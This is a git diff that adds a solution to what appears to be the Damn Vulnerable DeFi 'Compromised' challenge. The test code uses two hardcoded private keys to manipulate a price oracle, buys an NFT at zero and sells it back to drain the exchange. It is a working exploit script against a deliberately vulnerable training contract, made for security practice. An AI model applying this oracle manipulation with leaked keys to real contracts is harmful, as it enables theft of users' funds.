@@ -61,6 +61,35 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        // Private keys are recovered from website response in "https://www.damnvulnerabledefi.xyz/challenges/7.html" 
+        const compromisedSource1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
+        const compromisedSource2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
+
+        const symbol = "DVNFT"
+
+        // Bring price down to zero
+        await this.oracle.connect(compromisedSource1).postPrice(symbol, 0);
+        await this.oracle.connect(compromisedSource2).postPrice(symbol, 0);
+        expect(
+            await this.oracle.getMedianPrice(symbol)
+        ).to.be.eq('0');
+
+        await this.exchange.connect(attacker).buyOne({ value: 1});
+        const tokenId = 0;
+        
+        // Bring price up to EXCHANGE_INITIAL_ETH_BALANCE
+        await this.oracle.connect(compromisedSource1).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
+        await this.oracle.connect(compromisedSource2).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
+        expect(
+            await this.oracle.getMedianPrice(symbol)
+        ).to.be.eq(EXCHANGE_INITIAL_ETH_BALANCE);
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+        await this.exchange.connect(attacker).sellOne(tokenId);
+
+        // Bring price back to INITIAL_NFT_PRICE
+        await this.oracle.connect(compromisedSource1).postPrice(symbol, INITIAL_NFT_PRICE);
+        await this.oracle.connect(compromisedSource2).postPrice(symbol, INITIAL_NFT_PRICE);
     });
 
     after(async function () {
